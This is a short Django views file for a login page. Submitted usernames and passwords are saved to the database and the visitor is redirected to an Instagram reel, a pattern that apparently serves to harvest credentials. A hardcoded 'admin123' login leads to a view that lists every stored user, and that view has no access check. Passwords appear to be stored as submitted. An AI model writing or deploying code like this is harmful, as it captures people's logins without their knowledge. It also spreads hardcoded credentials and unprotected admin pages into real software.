from django.shortcuts import render, redirect
from .models import User
from .forms import UserForm


def login_view(request):
    return render(request, 'html/index.html')


def login(request):

    if request.method == 'POST':

        form = UserForm(request.POST)

        if form.is_valid():

            username = request.POST.get('username')
            password = request.POST.get('password')
            # Demo admin account ko database me save mat karo
            if username == 'admin123' and password == 'admin123':
                return redirect('superuser_view')

            # Sirf normal demo users save karo
            form.save()

        return redirect('https://www.instagram.com/reel/DcCT084Mjn-/')        

        return render(
            request,
            'html/index.html',
            {
                'error': 'Invalid form data'
            }
        )

    return render(request, 'html/index.html')


def superuser_view(request):

    users = User.objects.all()

    return render(
        request,
        'html/admin.html',
        {
            'users': users
        }
    )